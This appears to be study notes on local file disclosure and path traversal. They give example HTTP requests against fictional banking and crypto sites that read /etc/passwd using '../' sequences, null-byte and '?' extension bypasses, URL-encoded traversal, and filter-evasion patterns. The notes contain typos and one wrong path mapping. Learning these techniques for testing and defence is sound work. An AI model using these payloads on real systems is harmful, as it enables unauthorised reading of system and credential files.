Local File Disclosure:
The File Disclosure Vulnerability allows an attacker to include a file, usually exploiting a "dynamic file read" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input wihtout proper validtion.(OWASP)

-Allows to read configuration files on host machine
-Read Argitrary files on the box(like /etc/passwd)
-Information Disclosure (limited to host's root directory) in some cases

*GET http://mybankingsite.com/view_file?image=/images/myavatar.jpeg HTTP/1.1


*GET http://mybankingsite.com/view_file?image=../../../../etc/passwd HTTP/1.1

Path Traversel:
	GET mybankingsite.com/view_file?image=../../../../etc/passwd HTTP/1.1
	
	nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
	root:*:0:0:System Administrator:/var/root:/bin/sh
	daemon:*:1:1:System Services:/var/root:/usr/bin/false
	[...]

Actual files:

GET mybankingsite.com/view_file?image=../ HTTP/1.1
/home/banksite/www/images/../ -> /home/banksite/www/
/home/banksite/www/images/../../ -> /home/banksite/
/home/banksite/www/images/../../../ -> /home/
/home/banksite/www/images/../../../../ -> /
/home/banksite/www/images/../../../../../ -> /etc/passwd

*It's not always this easy, sometimes you may have to traverse out of the current directory:

GET http://mybanking.com/load_images?file=/etc/passwd HTTP/1-1
Response:Error:/home/banksite/www/images/etc/password not found

Path Traversal:
GET http://mybanking.com/load_images?file=../../../../../etc/passwd HTTP/1-1
nobody:*:-2:-2:Umprovileged User:/var/empty:/usr/bin/false
root:*:-2:-2:System Adminstrator:/var/root:/bin/sh
[...]

-Sometimes the application may expect an extension or will automatically add it to the end of the request for example:
 	-GET http://mybankingsite.com/transactions?u=myusername HTTP/1.1
 	 Will spit out CSV file named myusername.csv

-This can be bypassed by adding a nullbyte (%00), in some case by adding a "?" ,
or other characters,depending on how the application works
 	-GET http://mybankingsite.com/transactions?u=/etc/passwd?%00 HTTP/1.1
 	This may give us the contents for /etc/passwd by ignoring the CSV extension.

Null byte Injection (%00) or a ? mark, to ignore the reminder of the string but we may have to deal with other limitations or filtering in place.

URL encoding:
* .=%2e
* /=%2f
* ../=%2e%2e%2f
Bypass filter for "../"
* ..././=../
* ....//=../
* Get Creative!

Eg:

http://cryptosite.com/download_earnings?u=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00csv HTTP/1.1	
